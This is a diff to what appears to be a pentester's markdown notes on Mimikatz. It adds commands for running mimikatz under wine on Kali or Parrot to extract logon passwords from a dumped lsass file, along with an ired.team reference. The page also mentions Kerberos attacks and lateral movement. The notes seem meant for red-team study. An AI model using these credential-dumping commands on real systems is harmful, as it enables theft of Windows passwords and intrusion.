@@ -82,6 +82,13 @@ sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 ```
 
+[Dump passwords from lsass - iredteam](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz), with the twist of not worry about Windows making Windows Defender for Linux Free on Kali, Parrots, BlackArch, etc:
+```bash
+wine mimikatz/x64/mimikatz.exe
+sekurlsa::minidump /tmp/lsass.DMP
+sekurlsa::logonpasswords
+```
+
 
 ## Kerberos Attacks
 Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos and [[Active-Directory-Kerberos-Authentication-Defined]]. It is credential base so understanding [[Active-Directory-Authentication]] in part for [[Active-Directory-Privilege-Escalation]] and [[Active-Directory-Lateral-Movement]] as it is capable of command execution.
@@ -220,3 +227,4 @@ done
 [Custom Mimikatz by s3cur3th1ssh1t](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
 [thehacker.recipes](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey)
 [mimikatz](https://github.com/gentilkiwi/mimikatz) 
+[Dump passwords from lsass - iredteam](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
